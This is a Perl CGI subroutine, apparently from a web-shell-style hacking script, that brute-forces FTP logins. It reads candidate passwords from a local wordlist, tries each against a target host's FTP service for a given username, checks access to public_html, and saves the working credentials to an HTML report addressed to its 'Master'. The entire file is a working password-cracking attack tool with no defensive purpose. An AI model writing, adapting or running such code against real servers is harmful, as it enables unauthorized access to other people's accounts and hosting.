sub s_user {

	if(defined(${params{start}}) && ${params{start}} ne ""){

		if(-f "./passfind.txt"){

			unlink("./passfind.txt");

		}

		

		my $sch = "";

		if(defined(${params{start}}) && defined(${params{ip}})){

			$sch = ${params{ip}};



		}else{

			$sch = $ENV{'SERVER_NAME'};

		}



		my $scp = $ENV{'SERVER_PORT'};

		my $scr = $ENV{'SCRIPT_NAME'};

		my $save = './passfind.htm';

		my $pass = './pass.txt';

	

		my $user = ${params{start}};

		

		

		my @list = ();



		open(PASS, $pass);

		for(my $ln= "";$ln = readline( *PASS );$ln++){

			$ln =~ s/\r\n|\r|\n//g;

			push(@list, $ln);

		}

		while(($ln = readline( *PASS )) ) {

			$ln =~ s/\r\n|\r|\n//g;

			push(@list, $ln);

		}

		close (PASS);

		

		my $result = "";

		

		foreach my $line (@list){

			my $f6 = "";

			if(defined(${params{length}}) && length($line) == ${params{length}}){

				$f6 = $line;

			

			

				my $err = 0;

				my @dirlist = ();



				my $ftp = Net::FTP->new($sch, Debug => 0) or $err = 1;

		  			

	  			if($err == 0) {

					 $ftp->login($user, $f6) or $err = 2;

					 print $ftp->message();



				}

				

				if($err == 0) {

					@dirlist = $ftp->ls("./public_html/") or $err = 3;

					print $ftp->message();

				}



				if($err == 1) {

					print "Cannot connect to ", $sch ,"<br>";

				}

				

				if($err == 0 && scalar(@dirlist) > 0) {

					$result .= "<html><pre><body text=#9370db bgcolor=#111111 vlink=#62b1ae link=#62b1ae clink=white>======================\r\n";

					$result .= "Master i am : ".$user."\r\n";

					$result .= "My password is : ".$f6."\r\n";

					$result .= "My ip is : ".$sch."\r\n";

					$result .= "======================</pre></html>\r\n";

				}



				$ftp->quit();

			}	

		}

		

		open MOD, ">>".$save;

		

		print MOD $result;

		close MOD;	

	}		

}
